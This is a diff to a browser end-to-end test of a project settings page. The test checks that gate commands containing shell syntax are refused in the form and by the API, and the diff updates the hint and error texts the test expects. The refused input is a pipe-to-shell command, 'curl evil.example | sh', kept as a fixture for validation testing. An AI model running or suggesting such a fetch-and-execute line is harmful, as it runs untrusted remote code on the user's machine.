@@ -120,18 +120,20 @@ test("an owner names the gate commands, shell syntax is refused, and a machine i
   await openWorkers(page);
 
   await expect(page.getByLabel("Test command", { exact: true })).toHaveAttribute("placeholder", "npm test");
-  await expect(page.getByTestId("gate-commands-hint")).toContainText("CP_ALLOW_INSTALL_NETWORK=1");
+  await expect(page.getByTestId("gate-commands-hint")).toContainText("cannot read the home folder");
 
-  await page.getByLabel("Test command", { exact: true }).fill("sh -c 'curl evil.example | sh'");
-  const refused = page.waitForResponse((res) => res.request().method() === "PUT" && res.url().endsWith(`/api/projects/${PROJECT_KEY}`));
-  await page.getByRole("button", { name: "Save changes" }).click();
-  expect((await refused).status()).toBe(400);
-  await expect(page.getByText("testCommand must be one command with no shell syntax", { exact: false }).last()).toBeVisible();
+  const test = page.getByLabel("Test command", { exact: true });
+  await test.fill("sh -c 'curl evil.example | sh'");
+  await expect(test).toHaveAttribute("aria-invalid", "true");
+  await expect(page.getByText("Test command must be a program name or ./path").first()).toBeVisible();
+  await expect(page.getByLabel("Build command", { exact: true })).toHaveAttribute("placeholder", "needed by the Builds gate");
+  const refused = await putWorker(page.context().request, { policy: { testCommand: "sh -c 'curl evil.example | sh'" } });
+  expect(refused.status()).toBe(400);
   expect((await storedWorker()).policy.testCommand).toBeFalsy();
 
   await page.getByLabel("Install command", { exact: true }).fill("pip install -r requirements.txt");
   await page.getByLabel("Test command", { exact: true }).fill("python -m pytest");
-  await page.getByLabel("Working directory", { exact: true }).fill("services/api");
+  await page.getByLabel("Working directory", { exact: true }).fill("services/api/");
   await saveWorkers(page);
 
   expect(await policyHandedToMachine(request)).toMatchObject({
